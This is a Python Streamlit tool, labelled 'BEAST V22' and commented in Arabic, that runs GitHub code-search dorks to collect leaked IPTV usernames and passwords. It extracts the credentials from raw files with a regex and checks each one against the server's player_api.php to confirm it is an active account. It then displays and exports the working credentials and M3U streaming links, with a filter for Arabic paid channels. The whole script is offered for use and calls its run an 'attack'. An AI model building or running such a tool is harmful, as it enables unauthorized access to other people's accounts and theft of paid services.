import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures

# =================================================
# 1. نظام العزل البصري (إصلاح مشاكل التنسيق تماماً)
# =================================================
st.set_page_config(page_title="BEAST V22 SUPREMACY", layout="wide", page_icon="🔥")

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
    html, body, [class*="css"] { font-family: 'Tajawal', sans-serif; background-color: #080808; color: #ffffff; }
    .main-header { background: linear-gradient(90deg, #00ff41, #008f25); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 50px; text-align: center; font-weight: bold; margin-bottom: 20px; }
    .card-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; padding: 10px; }
    .iptv-card {
        background: #121212; border: 1px solid #1e1e1e; border-top: 4px solid #00ff41;
        border-radius: 12px; padding: 20px; position: relative; transition: 0.3s ease-in-out;
    }
    .iptv-card:hover { transform: translateY(-5px); border-color: #00ff41; box-shadow: 0 10px 20px rgba(0,255,65,0.1); }
    .host-label { color: #00ff41; font-weight: bold; font-size: 16px; word-break: break-all; margin-bottom: 10px; display: block; }
    .data-row { font-size: 14px; margin: 5px 0; color: #ccc; }
    .ar-indicator { position: absolute; top: 10px; right: 10px; background: #ff4b4b; color: white; padding: 2px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; }
    .m3u-link { background: #000; padding: 8px; border-radius: 6px; color: #00ff41; font-size: 11px; margin-top: 10px; border: 1px solid #222; width: 100%; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
</style>
""", unsafe_allow_html=True)

if 'hunt_results' not in st.session_state: st.session_state.hunt_results = []
if 'is_running' not in st.session_state: st.session_state.is_running = False
if 'checked' not in st.session_state: st.session_state.checked = 0

# =================================================
# 2. المحرك الهجومي (Extreme Search & Verify)
# =================================================

def verify_server(host, user, pw):
    try:
        # فحص الحساب
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=3).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # فحص المحتوى العربي العميق
            is_ar = False
            try:
                cat_url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
                cats = requests.get(cat_url, timeout=2).text.upper()
                keywords = ["ARABIC", "BEIN", "SSC", "SHAHID", "OSN", "NILESAT", "MYHD", "EGYPT"]
                if any(k in cats for k in keywords): is_ar = True
            except: pass

            return {
                "host": host, "user": user, "pass": pw, 
                "exp": exp, "ar": is_ar,
                "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. القائمة الجانبية
# =================================================
with st.sidebar:
    st.markdown("<h1 style='color:#00ff41;'>🌪️ BEAST V22</h1>", unsafe_allow_html=True)
    git_token = st.text_input("GitHub Token:", type="password", help="ضع توكن صالح لضمان جلب آلاف النتائج")
    
    st.divider()
    filter_ar = st.checkbox("فلتر المحتوى العربي فقط 🦅", value=True)
    
    col_a, col_b = st.columns(2)
    with col_a:
        if st.button("🚀 ابدأ الهجوم"): st.session_state.is_running = True
    with col_b:
        if st.button("🛑 توقف"): st.session_state.is_running = False

    st.metric("🔍 تم فحصه", st.session_state.checked)
    st.metric("💎 صيد ثمين", len(st.session_state.hunt_results))
    
    if st.session_state.hunt_results:
        st.divider()
        all_data = "\n".join([f"HOST: {i['host']}\nUSER: {i['user']}\nPASS: {i['pass']}\nEXP: {i['exp']}\nARABIC: {i['ar']}\nM3U: {i['m3u']}\n---" for i in st.session_state.hunt_results])
        st.download_button("📥 تحميل كل النتائج", all_data, "Beast_V22_Full.txt")

# =================================================
# 4. الرادار وعرض النتائج (Grid Layout)
# =================================================
st.markdown("<h1 class='main-header'>BEAST SUPREMACY V22</h1>", unsafe_allow_html=True)
display_container = st.container()

def refresh_ui():
    with display_container:
        data = st.session_state.hunt_results
        if filter_ar: data = [i for i in data if i['ar']]
        
        # إنشاء شبكة (3 كروت في الصف الواحد)
        cols = st.columns(3)
        for idx, item in enumerate(data):
            with cols[idx % 3]:
                ar_badge = '<div class="ar-indicator">ARABIC ✅</div>' if item['ar'] else ''
                st.markdown(f"""
                <div class="iptv-card">
                    {ar_badge}
                    <span class="host-label">{item['host']}</span>
                    <div class="data-row">👤 <b>User:</b> {item['user']}</div>
                    <div class="data-row">🔑 <b>Pass:</b> {item['pass']}</div>
                    <div class="data-row">📅 <b>Exp:</b> <span style="color:#ffa500;">{item['exp']}</span></div>
                    <div class="m3u-link">{item['m3u']}</div>
                </div>
                """, unsafe_allow_html=True)

if st.session_state.is_running:
    if not git_token:
        st.error("⚠️ يرجى إدخال التوكن لبدء الصيد!")
        st.session_state.is_running = False
    else:
        headers = {'Authorization': f'token {git_token}'}
        # دوركات "غواصة" تخترق آلاف الملفات العربية
        dorks = [
            '"player_api.php" SSC BEIN ARABIC',
            '"get.php?username=" password "SHAHID"',
            'extension:m3u "http" "OSN"',
            'filename:iptv.txt "ARABIC"',
            'filename:nilesat.txt',
            'filename:arab_iptv.txt'
        ]

        for dork in dorks:
            if not st.session_state.is_running: break
            for page in range(1, 10):
                if not st.session_state.is_running: break
                try:
                    search_api = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    r = requests.get(search_api, headers=headers).json()
                    
                    if 'items' in r:
                        for item in r['items']:
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                                for found in executor.map(lambda p: verify_server(*p), matches):
                                    st.session_state.checked += 1
                                    if found:
                                        st.session_state.hunt_results.insert(0, found)
                                        refresh_ui()
                except: continue
        st.session_state.is_running = False
        st.success("✅ اكتمل الهجوم العملاق.")
else:
    refresh_ui()
